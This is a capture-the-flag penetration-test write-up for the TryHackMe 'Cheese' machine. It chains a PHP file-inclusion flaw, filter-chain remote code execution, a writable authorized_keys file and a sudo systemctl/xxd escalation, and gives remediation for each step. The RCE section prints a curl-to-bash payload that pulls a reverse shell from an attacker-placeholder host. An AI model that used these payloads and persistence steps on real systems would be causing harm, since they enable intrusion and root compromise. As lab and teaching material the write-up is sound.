# Cheese CTF — Penetration Test Report

## Objective and Scope

The objective of this assessment was to evaluate the security posture of the **Cheese CTF** target machine (TryHackMe), identifying and exploiting vulnerabilities across the web application layer, SSH configuration, and host privilege model to achieve full system compromise.

## Scope of Work

**In-Scope Assets:**
- **Host:** `cheese.thm`
- **Services:** Web application (HTTP), SSH
- **Testing Perspective:** Unauthenticated external attacker

---

## Enumeration

### Web Enumeration

Directory brute-forcing with `dirsearch` identified:

```
/messages.html
```

Manual review of `messages.html` revealed a reference to:

```
secret-script.php?file=
```

The `file` parameter accepted arbitrary input, indicating a possible Local File Inclusion (LFI) point.

### Tools Used
- dirsearch
- php_filter_chain_generator
- netcat
- python http.server

---

## Vulnerabilities

| Vulnerability | Severity | Impact |
|---|---|---|
| Local File Inclusion via `php://filter` | High | Source code/data disclosure, foothold for RCE |
| PHP Filter Chain Remote Code Execution | Critical | Full remote code execution as web service user |
| Writable SSH `authorized_keys` | Critical | Persistent unauthorized SSH access |
| Privilege Escalation via Misconfigured `sudo systemctl` + GTFOBins | Critical | Root-level command execution |

---

### Local File Inclusion via `php://filter`

#### Severity
High

#### CWE
CWE-98: Improper Control of Filename for Include/Require Statement in PHP Program

#### OWASP Category
OWASP Top 10 2021 – A03: Injection

#### Description
The `secret-script.php` endpoint accepts a `file` parameter that is passed directly to a PHP include/file-read function without validation. This allows the use of PHP stream wrappers, specifically `php://filter`, to read arbitrary file contents on the server.

#### Affected Functionality
- `secret-script.php?file=`

#### Steps to Reproduce
1. Request `secret-script.php?file=php://filter/resource=<target>`.
2. Observe that the application returns the contents of the requested resource rather than an error.

#### Proof of Concept
```
GET /secret-script.php?file=php://filter/resource=supersecretmessageforadmin
```
Response returned the contents of the targeted resource, confirming the `php://filter` wrapper was processed by the application.

#### Impact
- Disclosure of application source code and sensitive files
- Provides the foundation for filter-chain based code execution (see next finding)

#### Root Cause
User-supplied input is passed directly into a file-inclusion sink without validating against an allow-list of expected files or disabling PHP stream wrappers.

#### Recommendation
- Never pass user input directly to `include`/`require`/file-read functions
- Use an allow-list of permitted filenames mapped via an internal identifier
- Disable `allow_url_include` and restrict usable PHP stream wrappers
- Apply input validation and reject path/wrapper syntax (`php://`, `../`, etc.)

#### References
- OWASP Top 10 2021 – A03: Injection
- CWE-98

---

### PHP Filter Chain Remote Code Execution

#### Severity
Critical

#### CWE
CWE-94: Improper Control of Generation of Code ('Code Injection')

#### OWASP Category
OWASP Top 10 2021 – A03: Injection

#### Description
Because the application processes `php://filter` chains on attacker-controlled input, it is possible to craft a filter chain that converts an attacker-supplied string into executable PHP code, which the application then evaluates. Using the `php_filter_chain_generator` tool, a chain was generated that fetched and executed a remote shell script, resulting in remote code execution.

#### Affected Functionality
- `secret-script.php?file=` (same sink as the LFI finding)

#### Steps to Reproduce
1. Generate a PHP filter chain payload that, when decoded by the PHP filter stack, produces executable PHP code:
   ```bash
   python3 php_filter_chain_generator.py --chain '<?= `curl -s -L <attacker_ip>/rce.py|bash` ?>'
   ```
2. Host a reverse-shell payload (`rce.py`) on an attacker-controlled web server.
3. Start a netcat listener on the attacker machine.
4. Submit the generated filter chain as the `file` parameter to `secret-script.php`.

#### Proof of Concept
Submitting the generated filter chain resulted in the target server retrieving and executing the hosted payload, producing an interactive reverse shell on the attacker's listener.

#### Impact
- Full remote code execution in the context of the web service account
- Establishes initial foothold on the host, enabling further lateral movement and privilege escalation

#### Root Cause
Combination of unrestricted `php://filter` wrapper usage and evaluation of filter output as executable PHP code, with no input sanitization or sandboxing of the file-inclusion sink.

#### Recommendation
- Remediate the underlying LFI (see previous finding) — this is the primary fix
- Disable PHP filter chain wrappers where file inclusion is required
- Run the web application with a restricted, least-privilege OS account
- Apply egress filtering to prevent the application server from making outbound requests to arbitrary hosts

#### References
- OWASP Top 10 2021 – A03: Injection
- CWE-94
- [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

---

### Writable SSH `authorized_keys`

#### Severity
Critical

#### CWE
CWE-732: Incorrect Permission Assignment for Critical Resource

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
Following the initial foothold, the `~/.ssh/authorized_keys` file for the user `comte` was found to be writable by the compromised web service account. An attacker can append their own SSH public key to this file to gain persistent, password-less SSH access as `comte`.

#### Affected Functionality
- `/home/comte/.ssh/authorized_keys`

#### Steps to Reproduce
1. From the initial foothold shell, check permissions on `/home/comte/.ssh/authorized_keys`.
2. Append an attacker-controlled SSH public key to the file.
3. Connect via SSH using the corresponding private key:
   ```bash
   ssh comte@cheese.thm -i <attacker_private_key>
   ```

#### Proof of Concept
SSH login as `comte` succeeded using the attacker-supplied key, with no password required, confirming the file was writable and trusted by `sshd`.

#### Impact
- Persistent unauthorized access to the `comte` account independent of any password
- Provides a stable foothold for further privilege escalation

#### Root Cause
Incorrect file permissions on a security-critical configuration file allow modification by a lower-privileged or compromised account.

#### Recommendation
- Restrict `~/.ssh/authorized_keys` to be writable only by its owning user (`chmod 600`)
- Audit file and directory permissions across the filesystem for unintended write access by service accounts
- Monitor `authorized_keys` files for unexpected modifications

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-732

---

### Privilege Escalation via Misconfigured `sudo systemctl` and GTFOBins (`xxd`)

#### Severity
Critical

#### CWE
CWE-269: Improper Privilege Management

#### OWASP Category
OWASP Top 10 2021 – A05: Security Misconfiguration

#### Description
The `comte` user was permitted to run specific `systemctl` commands as root without a password (`NOPASSWD`), including control over a custom `exploit.timer` systemd unit. The timer unit's associated job executed a binary (`xxd`) that is documented in GTFOBins as exploitable to read arbitrary files. By modifying the timer to fire quickly and triggering it via the permitted `sudo systemctl` commands, the attacker was able to use `xxd` to read the root flag.

#### Affected Functionality
- `sudo systemctl daemon-reload`
- `sudo systemctl restart/start/enable exploit.timer`
- `/opt/xxd`

#### Steps to Reproduce
1. Run `sudo -l` to enumerate allowed commands:
   ```
   (ALL) NOPASSWD: /bin/systemctl daemon-reload
   (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
   (ALL) NOPASSWD: /bin/systemctl start exploit.timer
   (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
   ```
2. Inspect `/etc/systemd/system/exploit.timer` and modify its trigger interval to fire quickly.
3. Reload and restart the timer using the permitted `sudo systemctl` commands.
4. Use the `/opt/xxd` binary (GTFOBins technique) to read a root-owned file:
   ```bash
   ./xxd "/root/root.txt" | xxd -r
   ```

#### Proof of Concept
The contents of `/root/root.txt` were successfully read by a non-root user via the `xxd` GTFOBins technique, triggered through the permitted `sudo systemctl` commands.

#### Impact
- Full privilege escalation to root-equivalent file read/write access
- Complete compromise of host confidentiality and integrity

#### Root Cause
Overly broad `sudo` permissions combined with a custom systemd unit invoking a binary with known privilege-escalation primitives (GTFOBins).

#### Recommendation
- Apply least privilege to `sudo` configuration — avoid granting `NOPASSWD` access to `systemctl` for units that execute attacker-influenceable binaries
- Remove or restrict GTFOBins-listed binaries (`xxd` and similar) from systemd units running with elevated privileges
- Regularly audit `sudoers` entries and custom systemd units for privilege escalation paths
- Reference [GTFOBins](https://gtfobins.org/) during configuration review to identify dangerous binary/permission combinations

#### References
- OWASP Top 10 2021 – A05: Security Misconfiguration
- CWE-269
- [GTFOBins](https://gtfobins.org/)

---

## Attack Chain Summary

1. Discovered LFI via `secret-script.php?file=` using `php://filter`
2. Escalated LFI to RCE using a PHP filter chain payload
3. Gained initial foothold as the web service user
4. Found writable `authorized_keys` for `comte` and established persistent SSH access
5. Identified `sudo systemctl` misconfiguration tied to a custom systemd timer
6. Abused GTFOBins technique on `xxd` via the timer to read root-owned files

## Key Takeaways

- Always test `php://filter`-style wrappers when LFI is suspected
- Writable `authorized_keys` files provide instant, password-less persistence
- Custom systemd units combined with permissive `sudo` rules are a common privilege escalation vector
- GTFOBins should be checked against any binary referenced in `sudoers` or systemd units running as root